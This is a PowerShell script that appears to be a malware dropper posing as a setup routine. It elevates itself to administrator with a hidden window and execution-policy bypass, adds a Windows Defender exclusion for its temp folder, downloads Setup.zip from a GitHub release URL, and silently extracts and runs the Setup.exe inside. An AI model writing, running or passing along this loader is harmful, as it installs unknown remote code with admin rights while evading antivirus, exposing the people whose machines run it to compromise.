param([string]$OriginalTemp = $env:TEMP)

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`""
    Start-Process -FilePath "powershell.exe" -ArgumentList $elevatedCommand -Verb RunAs
    exit
}

$outputZip = [IO.Path]::Combine($OriginalTemp, "Setup.zip")
$extractPath = [IO.Path]::Combine($OriginalTemp, "SetupExtracted")
$exePath = [IO.Path]::Combine($extractPath, "Setup.exe")

try {
    if (!(Test-Path $extractPath)) {
        New-Item -Path $extractPath -ItemType Directory -Force | Out-Null
    }

    try {
        Add-MpPreference -ExclusionPath $extractPath
    } catch {
        Write-Host "Defender exclusion atlanıyor: $($_.Exception.Message)"
    }

    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri "https://github.com/Core-Robot/grpc/releases/download/public/Setup.zip" -OutFile $outputZip

    if (Test-Path $outputZip) {
        Expand-Archive -Path $outputZip -DestinationPath $extractPath -Force
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden
        }
    }
}
catch {
    exit
}
